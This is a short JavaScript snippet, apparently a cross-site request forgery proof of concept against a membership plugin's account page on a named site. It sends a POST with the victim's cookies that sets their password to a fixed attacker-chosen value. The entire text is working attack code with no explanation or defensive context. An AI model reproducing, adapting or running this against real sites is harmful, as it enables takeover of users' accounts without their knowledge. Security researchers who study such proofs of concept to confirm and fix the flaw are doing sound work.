var xhr = new XMLHttpRequest();
xhr.open("POST", "https://itpm.com:443/itpm-account/?action=newpassword", true);
xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.withCredentials = true;

var body = "plugin=mepr&action=updatepassword&mepr-new-password=KarnelPass1R%40&mepr-confirm-password=KarnelPass1R%40";

// Directly send the body without converting to a Blob
xhr.send(body);
